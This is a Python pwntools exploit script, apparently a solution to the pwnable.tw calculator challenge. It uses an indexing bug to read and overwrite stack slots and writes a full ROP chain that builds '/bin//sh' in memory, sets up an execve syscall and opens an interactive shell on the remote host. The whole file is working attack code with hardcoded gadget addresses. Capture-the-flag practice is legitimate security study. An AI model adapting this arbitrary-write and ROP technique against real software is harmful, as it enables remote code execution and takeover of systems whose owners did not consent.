#!/usr/bin/env python3
from pwn import *


io = remote('chall.pwnable.tw', 10100)

# Consume the initial welcome banner
io.recvline() 


def read_val(offset):
    """
    Read memory at the given pool offset.
    Sends '+OFFSET' and parses the integer response.
    """
    io.sendline(f"+{offset}".encode())
    return int(io.recvline().strip())

def write_val(offset, target_value):
    """
    Write an arbitrary value to the given pool offset.
    Because the bug works via addition (pool[offset] += input), 
    we must calculate the mathematical difference.
    """
    current_value = read_val(offset)
    
    diff = target_value - current_value
    
    if diff > 0:
        payload = f"+{offset}+{diff}"
    elif diff < 0:
        payload = f"+{offset}{diff}" # diff already includes the minus sign (e.g. +361-50)
    else:
        return 
        
    io.sendline(payload.encode())
    io.recvline() #

BIN_CHUNK  = u32(b"/bin")   
SH_CHUNK   = u32(b"//sh")   


rop_chain = {
    361: 0x080701aa, # pop edx ; ret
    362: 0x080ec060, # @ .data
    363: 0x0805c34b, # pop eax ; ret
    364: BIN_CHUNK,  # '/bin'
    365: 0x0809b30d, # mov dword ptr [edx], eax ; ret
    366: 0x080701aa, # pop edx ; ret
    367: 0x080ec064, # @ .data + 4
    368: 0x0805c34b, # pop eax ; ret
    369: SH_CHUNK,   # '//sh'
    370: 0x0809b30d, # mov dword ptr [edx], eax ; ret
    371: 0x080701aa, # pop edx ; ret
    372: 0x080ec068, # @ .data + 8
    373: 0x080550d0, # xor eax, eax ; ret
    374: 0x0809b30d, # mov dword ptr [edx], eax ; ret
    375: 0x080481d1, # pop ebx ; ret
    376: 0x080ec060, # @ .data
    377: 0x080701d1, # pop ecx ; pop ebx ; ret
    378: 0x080ec068, # @ .data + 8
    379: 0x080ec060, # padding without overwrite ebx
    380: 0x080701aa, # pop edx ; ret
    381: 0x080ec068, # @ .data + 8
    382: 0x080550d0, # xor eax, eax ; ret
    
    # 11 times "inc eax ; ret" to set EAX to 11 (SYS_execve)
    383: 0x0807cb7f, # inc eax ; ret
    384: 0x0807cb7f, # inc eax ; ret
    385: 0x0807cb7f, # inc eax ; ret
    386: 0x0807cb7f, # inc eax ; ret
    387: 0x0807cb7f, # inc eax ; ret
    388: 0x0807cb7f, # inc eax ; ret
    389: 0x0807cb7f, # inc eax ; ret
    390: 0x0807cb7f, # inc eax ; ret
    391: 0x0807cb7f, # inc eax ; ret
    392: 0x0807cb7f, # inc eax ; ret
    393: 0x0807cb7f, # inc eax ; ret
    
    394: 0x08049a21  # int 0x80 (syscall)
}

log.info("Sequentially writing ROP chain gadgets to stack offsets...")
for offset, val in rop_chain.items():
    log.info(f"Writing {hex(val)} to pool[{offset}]")
    write_val(offset, val)

log.success("ROP chain successfully written!")

log.info("Sending non-numeric line to trigger function return...")
io.sendline(b"LET_US_GO") 

io.interactive()
